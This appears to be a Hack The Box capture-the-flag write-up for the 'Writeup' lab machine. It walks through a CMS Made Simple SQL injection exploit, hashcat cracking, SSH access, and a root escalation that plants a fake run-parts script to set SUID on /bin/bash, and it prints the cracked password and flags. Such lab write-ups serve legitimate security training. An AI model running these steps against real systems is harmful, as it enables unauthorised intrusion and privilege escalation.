@@ -1,0 +1,127 @@
+#HTB: Writeup
+- Date completed: July 23, 2025
+- Difficulty: Easy
+- Methodology: Web enumeration → SQL injection → hash cracking → SSH login → privesc via staff group + update-motd
+
+#Recon
+
+-Nmap scan:
+
+kali@kali:~/HTB/CTF/Wr173uP$ sudo nmap -sS --top-ports 1000 10.129.80.58                             
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+-Checking out the webserver running, showed that it was running CMS Made Simple 2019.
+
+-Looking at Exploit-DB, there was an exploit that matched version for an Unauthenticated SQL Injection.
+
+-Downloading the script:
+
+wget https://www.exploit-db.com/download/46635
+
+-Had to update the script to use python3
+
+-Running the scrip:
+
+python3 46635.py -u http://10.129.80.58/writeup
+
+[+] Salt found: 5a599ef579066807
+[+] Username found: jk9
+[+] Email found: jkr@6
+[+] Password found: 62def4866937f08cc13bab43bb14e6f7
+
+-The script queried the sql database and found us a username, salt, and md5 password hash.
+
+-Running hashcat:
+
+kali@kali:~/HTB/CTF/Wr173uP$ hashcat -m 20 -a 0 jk9-hash.txt /usr/share/wordlists/rockyou.txt --force
+
+62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
+
+#FOOTHOLD
+
+Logging in with the newly found creds with SSH:
+
+kali@kali:~/HTB/CTF/Wr173uP$ ssh jkr@10.129.80.58                                                  
+jkr@10.129.80.58's password:
+
+jkr@writeup:~$
+
+-Getting user.txt:
+
+jkr@writeup:~$ cat user.txt
+91217e949b53cec1119c5187d3263c2a
+
+#PRIVESC RECON
+
+-Taking a look at the output from the id command:
+
+jkr@writeup:~$ id
+uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
+
+-The staff group stands out, as the group allows users toa dd local modifications to the system (usr/local) without needing root privileges.
+
+-Validating that statement:
+
+jkr@writeup:~$ ls -ld /usr/local/bin/ /usr/local/sbin/
+drwx-wsr-x 2 root staff 20480 Apr 19  2019 /usr/local/bin/
+drwx-wsr-x 2 root staff 12288 Apr 19  2019 /usr/local/sbin/
+
+-Both paths are typically in the root user's $PATH env variable, which means we could inject our own malicous program root would likely run. To find out what the root user is executing or what's triggering the root user to execute something we could use pspy to achieve this.
+
+-Downloading pspy:
+
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy32
+
+Uploading pspy:
+
+scp pspy32 jkr@10.10.10.138:~/
+
+Running pspy:
+
+jkr@writeup:~$ chmod +x pspy32 
+jkr@writeup:~$ ./pspy32 
+
+-After running, nothing useful stood out. While I let this run, I SSH'd back in as jkr in another tab, and noticed this line in the pspy output:
+
+2025/07/23 17:57:34 CMD: UID=0    PID=2542   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+
+Seeing that root user is running sh, triggered by our login. Looking at GTFObins, we run:
+
+jkr@writeup:~$ echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts
+
+#PRIVESC
+
+-After running that one-liner, we exit out and log back in with SSH:
+
+kali@kali:~/HTB/CTF/Wr173uP$ ssh jkr@10.129.80.58                                                    
+jkr@10.129.80.58's password:
+
+-bash-4.4$ 
+
+-To verify the SUID bit was set we run:
+
+-bash-4.4$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1099016 May 15  2017 /bin/bash
+
+#PWNED
+
+-Finally to own root we run:
+
+-bash-4.4$ /bin/bash -p
+
+-Getting root.txt:
+
+bash-4.4# cat /root/root.txt
+e822e3781fb7436396086f17df8405bf
+
+#FLAGS
+
+user.txt:91217e949b53cec1119c5187d3263c2a
+root.txt:e822e3781fb7436396086f17df8405bf
+
+#SUMMARY
+
+The target was running an outdated CMS Made Simple instance vulnerable to unauthenticated SQL injection. This was used to extract the salt and MD5 hash of a user’s password. After cracking the hash, SSH access was obtained as jkr. Privilege escalation was achieved via abuse of the staff group, which allowed writing to /usr/local/bin. Observing system activity with pspy revealed a root-level cron-like task invoking run-parts from a writable path, allowing for SUID bash injection and root shell access.
